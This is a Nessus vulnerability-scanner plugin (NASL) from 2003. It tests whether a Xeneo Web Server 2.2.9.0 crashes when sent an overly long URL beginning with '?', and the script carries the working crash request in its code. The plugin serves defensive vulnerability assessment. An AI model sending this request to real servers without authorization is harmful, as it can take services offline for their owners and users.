#
# This script was written by BEKRAR Chaouki <bekrar@adconsulting.fr>
#
# Xeneo Web Server 2.2.9.0 Denial of Service
#
# http://www.k-otik.com/bugtraq/04.22.Xeneo.php
#
# From : "badpack3t" <badpack3t@security-protocols.com> 
# To   :  full-disclosure@lists.netsys.com
# Subject : Xeneo Web Server 2.2.9.0 Denial Of Service Vulnerability

if(description)
{
 script_id(11545);
 script_version ("$Revision: 1.3 $");
 name["english"] = "Xeneo Web Server 2.2.9.0 DoS";
 name["francais"] = "Xeneo Web Server 2.2.9.0 DoS";
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
Requesting an overly long URL starting with an interrogation
mark (as in /?AAAAA[....]AAAA) crashes the remote server
(possibly Xeneo Web Server).

Solution : upgrade to latest version of Xeneo Web Server
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Xeneo Web Server 2.2.9.0 DoS";
 summary["francais"] = "Xeneo Web Server 2.2.9.0 DoS";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 A.D.Consulting France",
		francais:"Ce script est Copyright (C) 2003 A.D.Consulting France");
 family["english"] = "Denial of Service";
 family["francais"] = "Deni de Service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
 if ( ! can_host_php(port:port) ) exit(0);
 if(http_is_dead(port:port))exit(0);
 soc = http_open_socket(port);
 if(soc)
 {
  buffer = http_get(item:string("/?", crap(4096)), port:port);
  send(socket:soc, data:buffer);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port))security_hole(port);
 }
}

